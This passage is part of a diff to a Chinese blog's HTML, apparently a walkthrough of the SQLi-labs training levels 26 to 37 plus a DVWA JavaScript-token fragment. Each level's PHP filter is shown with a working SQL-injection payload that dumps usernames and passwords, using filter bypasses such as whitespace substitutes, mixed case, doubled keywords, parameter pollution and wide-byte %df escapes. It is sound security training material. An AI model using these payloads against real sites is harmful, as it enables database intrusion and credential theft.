class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  这里过滤规则变多了，把 or，and，/*，#，–，/和空格给过滤掉 </p>
+<ul>
+<li><p>绕过方法</p>
+<ul>
+<li>之前已经提过and，or和注释符被过滤时候的绕过方法，这里不再赘述</li>
+<li>空格被过滤可以使用如下的符号来代替</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">符号</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">%09</td>
+<td align="left">TAB 键(水平)</td>
+</tr>
+<tr>
+<td align="left">%0a</td>
+<td align="left">新建一行</td>
+</tr>
+<tr>
+<td align="left">%0c</td>
+<td align="left">新的一页</td>
+</tr>
+<tr>
+<td align="left">%0d</td>
+<td align="left">return 功能</td>
+</tr>
+<tr>
+<td align="left">%0b</td>
+<td align="left">TAB 键(垂直)</td>
+</tr>
+<tr>
+<td align="left">%a0</td>
+<td align="left">空格</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26&#x2F;</span><br><span class="line">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||&#39;1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>该方法无法再window上实现，因为有些符号不能被解析,这里借助了在线容器进行测试</p>
+<p><a class="link"   href="https://www.vsplate.com/labs.php" >https://www.vsplate.com/labs.php<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>与 Less-26 相比，只是拼接方式改为了<code>(&#39;$id&#39;)</code>，因为没有输出报错信息，所以不能使用报错注入了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||(&#39;1</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure>
+<p>这里解释一下正则匹配修饰符的含义：</p>
+<table>
+<thead>
+<tr>
+<th>模式修正符号</th>
+<th>功能描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>i</td>
+<td>在和正则匹配是不区分大小写</td>
+</tr>
+<tr>
+<td>m</td>
+<td>将字符串视为多行。(具体作用就是防止双写绕过)</td>
+</tr>
+<tr>
+<td>s</td>
+<td>如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。</td>
+</tr>
+</tbody></table>
+<p>通过源码我们知道了后端对那些字符进行了过滤，虽然这里对<code>union</code>和<code>select</code>做了部分过滤，但是任然存在可以绕过的漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27&#x2F;</span><br><span class="line">?id&#x3D;100&#39;unIon%0bSelEcT%0b1,database(),&#39;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>这关在Less-27的基础上，把闭合方式改为<code>&quot;$id&quot;</code>，同时屏蔽了错误信息显示，因此无法进行报错注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27a&#x2F;</span><br><span class="line">?id&#x3D;100&quot;unIon%0bSelEcT%0b1,database(),&quot;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>
+<p>闭合方式为<code>(&#39;$id&#39;)</code>，，并且取消了select不能双写的限制，增加了对<code>union select</code>连在一起的时候且不区分大小写的过滤，且屏蔽了错误信息显示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)uniunion%0bselecton%0bselect%0b1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>本关在less-28的基础上竟然还少了前面的几个限制，只留下了最后一个对<code>union select</code>的过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;) uniunion selecton select 1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><ul>
+<li><p>查看源码</p>
+<ul>
+<li>index.php</li>
+</ul>
+<p>并没有什么特别的，平平无奇，使用联合注入即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>login.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $id1;</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里面有2个函数，<strong>java_implimentation</strong>的作用是将传入的参数以<code>&amp;</code>分隔，如果该参数的前两个字符为<code>id</code>，则取它的第三个字符开始的30个字符作为<code>$id_value</code>，并返回<code>$id_value</code>，同时跳出循环。<strong>whitelist</strong>的作用是检查传入的字符串是否是数字，是的话就直接返回该字符串，否则就跳转到hacked.php。</p>
+</li>
+<li><p>利用方式</p>
+</li>
+</ul>
+<p>由于<strong>java_implimentation</strong>函数只要检测到一个<code>id</code>参数就退出检测，那么当我们传入2个名为<code>id</code>的参数时，后面的那一个就能绕过检测，从而可以利用其来进行注入。那么问题是，我们后端使用<code>$id=$_GET[&#39;id&#39;];</code>获取到的<code>id</code>参数究竟是第一个还是第二个呢。假设用户输入这样的语句：</p>
+  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>  Apache PHP 会解析最后一个参数</p>
+<p>  Tomcat JSP 会解析第一个参数</p>
+<p>可以看出，我们可以构造第二个<code>id</code>参数来绕过检测。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>和Less-29相比，index.php页面的错误信息显示被屏蔽了，闭合方式改为<code>&quot;$id&quot;</code>，其他照旧。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>和Less-29相比，闭合方式改为<code>(&quot;$id&quot;)</code>，其他不变。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># \ 转换为 \\</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &#x27; 转为\&#x27;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                         </span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用方法</li>
+</ul>
+<p>这里使用宽字节注入，在被过滤的符号前面加入<code>%df</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
+<p>此处过滤使用函数 <strong>addslashes()</strong> 返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：  单引号（’）  双引号（”）  反斜杠（\）</p>
+<p>这里依然可以使用宽字节注入绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-33&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = addslashes(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= addslashes(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>
+<p>和Less-33的过滤方法一样，只不过换成了POST方式提交数据，而POST方式无法直接使用<code>%df</code>来进行注入，需要用Burp Suite进行抓包改包。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305173404414.png" alt="image-20210305173404414"></p>
+<p>在图中的%27前面加上<code>%df</code>即可。</p>
+<ul>
+<li>这里还有另一种思路</li>
+</ul>
+<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘ 。我们就 可以利用这个方式进行尝试。</p>
+<p>可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>尝试一个经典的万能密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305175129233.png" alt="image-20210305175129233"></p>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>这一关的参数的数据类型为数字型，也就是说无需<code>&#39;</code>来闭合参数，但是这里的过滤措施和Less-33完全一致，相当与无用功。。直接进行联合注入即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>)</span><br></pre></td></tr></table></figure>
+<p>这里使用了**mysql_real_escape_string()**函数进行转义，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。下列字符受影响： </p>
+<p> (\x00)  (\n)  (\r)   (‘)  (“)  (\x1a)</p>
+<p>这里仍然可以使用宽字节注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-36&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 <strong>mysql_real_escape_string()</strong> 函数，而不是 **addslashes()**函数，但是原理是一样的。都是通过截包改包的方法进行注入。或者使用将 utf-8 转换为 utf-16 或 utf-32的方法直接在hackbar进行POST请求。</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
@@ -8011,7 +8153,7 @@
 <p>和medium难度一样从外部引入js代码,然后我们发现代码被混淆了，根本无法看懂，利用 <a class="link"   href="http://deobfuscatejavascript.com/" >http://deobfuscatejavascript.com<i class="fas fa-external-link-alt"></i></a> 这个网站可以把回校的代码转换为能看懂一些的代码，其中关键的部分在这里。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
 <p>这里的执行过程如下：</p>
-<p>首先是将phrase的值清空，然后就执行<strong>token_part_1(“ABCD”, 44)**，此时会执行</strong>do_something()<strong>，把phrase的值倒叙赋给token，然后到延迟3秒调用的</strong>token_part_2(“XX”)<strong>函数，即生成<code>&#39;XX&#39;+token的值</code>的sha256值，再赋值给token，接着当我们提交的时候会触发 click 事件调用</strong>token_part_3**函数即生成<code>token的值+&#39;ZZ&#39;</code>的sha256值，再赋值给token。</p>
+<p>首先是将phrase的值清空，然后就执行<strong>token_part_1(“ABCD”, 44)**，此时会执行do_something()，把phrase的值倒叙赋给token，然后到延迟3秒调用的</strong>token_part_2(“XX”)<strong>函数，即生成<code>&#39;XX&#39;+token的值</code>的sha256值，再赋值给token，接着当我们提交的时候会触发 click 事件调用</strong>token_part_3**函数即生成<code>token的值+&#39;ZZ&#39;</code>的sha256值，再赋值给token。</p>
 <p>知道token生成过程之后我们就可以自己进行调用生成success的token了，我们在输入框输入success后，到控制台中输入 <code>token_part_1()</code> ，再输入 <code>token_part_2(&quot;XX&quot;)</code> ，再提交即可。</p>
 <h3 id="Impossible-13"><a href="#Impossible-13" class="headerlink" title="Impossible"></a>Impossible</h3><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226210717955.png" alt="image-20210226210717955"></p>
 <p>不给任何输入的地方就是最好的防御，妙啊。。</p>
